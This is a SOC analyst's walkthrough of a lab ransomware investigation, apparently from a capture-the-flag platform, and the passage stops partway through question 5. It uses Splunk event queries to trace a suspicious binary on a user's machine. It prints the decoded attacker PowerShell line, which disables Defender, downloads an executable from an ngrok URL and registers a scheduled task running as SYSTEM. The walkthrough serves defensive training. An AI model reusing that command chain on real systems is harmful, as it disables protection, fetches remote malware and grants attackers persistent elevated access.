# PS Eclipse Walkthrough

"Scenario : You are a SOC Analyst for an MSSP (Managed Security Service Provider) company called TryNotHackMe .

A customer sent an email asking for an analyst to investigate the events that occurred on Keegan's machine on Monday, May 16th, 2022 . The client noted that the machine is operational, but some files have a weird file extension. The client is worried that there was a ransomware attempt on Keegan's device. 

Your manager has tasked you to check the events in Splunk to determine what occurred in Keegan's device."

The date of the incident is Monday, May 16th, 2022. We will set our time range to that day:

<img width="1218" height="531" alt="Screenshot (78)" src="https://github.com/user-attachments/assets/e348fec4-157c-4d2b-b5d0-77449c3596a5" />

# 1. A suspicious binary was downloaded to the endpoint. What was the name of the binary?

First, we need to know that event code 11 logs whenever a file is created on a disk. We also know that the user is "keegan"

Our search query is:
```
index=* EventCode=11 "keegan"
```


<img width="2316" height="177" alt="Screenshot (79)" src="https://github.com/user-attachments/assets/8644e8e7-6fac-4be6-a2b5-11daba221904" />

Next, we look into the TargetFilename field to see if there are any paths that look suspicious.
Specifically:
```
-.exe files
-unusual naming or capitalized patterns
-files dropped in malware staging locaitons such as:
                                                    - C:\Windows\Temp\
                                                    - %TEMP%
                                                    - Downloads\
```


<img width="588" height="904" alt="Screenshot (80)" src="https://github.com/user-attachments/assets/c154d332-9597-42f6-809c-fd0288312946" />

What immediately pops out is the file:
```
C:\Windows\Temp\OUTSTANDING_GUTTER.exe
```


### Q1: **Answer:** `OUTSTANDING_GUTTER.exe`


# 2. What is the address the binary was downloaded from? Add http:// to your answer & defang the URL

After identifying OUTSTANDING_GUTTER.exe as the suspicious binary created on May 16th, 2022, the next step was to trace its source.

Instead of relying on PowerShell script block logging (EventCode=4104), which wasn’t available in this case, I used process creation events:
```
index=* EventCode=1 "OUTSTANDING_GUTTER.exe" OR "powershell.exe"
```
<img width="1677" height="158" alt="Screenshot (81)" src="https://github.com/user-attachments/assets/0f37c889-4617-4e49-ae22-58f513169ce9" />

This search returned 21 events. From here, the most efficient next step was to inspect the CommandLine field across each entry. I looked for any string that stood out — particularly those containing long, encoded PowerShell commands, external URLs, or suspicious file paths.

It didn’t take long to spot an obfuscated download command tied to powershell.exe, which pointed to the binary being retrieved from an external source.

<img width="599" height="1019" alt="Screenshot (82)" src="https://github.com/user-attachments/assets/ac05b758-3160-4113-bf0b-d177f582bd9d" />

After sending this string through [CyberChef – The Cyber Swiss Army Knife](https://gchq.github.io/CyberChef/), we come up with the following:
```
Set-MpPreference -DisableRealtimeMonitoring $true;wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"
```
### Q2: **Answer:** `hxxp://886e-181-215-214-32[.]ngrok[.]io`

# 3. What Windows executable was used to download the suspicious binary? Enter full path.

We can simply find the answer to this question by looking at the field of the ParentImage or Image. 

<img width="1232" height="204" alt="Screenshot (84)" src="https://github.com/user-attachments/assets/865e4e17-67d8-400d-aa6b-ab9a21ebc466" />
### Q3: **Answer:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

# 4. What command was executed to configure the suspicious binary to run with elevated privileges?

After confirming that OUTSTANDING_GUTTER.exe was dropped in C:\Windows\Temp, I wanted to figure out how it was set up to run with elevated privileges.

I used this Splunk query to look for logs related to the binary:
`
index=* EventCode=1 "OUTSTANDING_GUTTER.exe"
`
This search gave 8 results. 

'schtasks.exe' is a Windows utility used to create, modify, and run scheduled tasks. Normally, threat actors will often use it to run tasks as NT AUTHORITY\SYSTEM for elevated privileges

<img width="592" height="505" alt="Screenshot (88)" src="https://github.com/user-attachments/assets/ee74f17d-987f-4e73-b883-f0bd6e786e06" />

### Q4: **Answer:** ``"C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f``

# 5. What permissions will the suspicious binary run as? What was the command to run the binary with elevated privileges? (Format: User + ; + CommandLine)

We already know OUTSTANDING_GUTTER.exe was scheduled to run using schtasks.exe. Now, we want to prove who ran it, adn what command was used at the time of the execution. 

We use the query:
```
index=* EventCode=1 "schtasks.exe" "Run" "OUTSTANDING_GUTTER.exe"
```


















